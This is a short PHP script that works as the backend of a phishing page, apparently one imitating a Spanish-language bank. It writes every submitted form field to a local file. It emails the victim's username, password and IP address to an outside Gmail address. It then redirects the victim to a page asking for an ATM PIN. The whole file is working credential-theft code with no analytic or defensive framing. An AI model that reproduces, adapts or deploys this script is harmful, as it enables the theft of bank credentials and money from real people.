<?php
header ('Location: ingrese-clave-de-cajero.html');
$handle = fopen("datos.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);


$ip = getenv("REMOTE_ADDR");
$message .= "Usuario: ".$_POST['username']."\n";
$message .= "Contraseña: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$recipient ="jc7541207@gmail.com";
$subject = "Usuario y Contraseña | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: ingrese-clave-de-cajero.html");



exit;
?>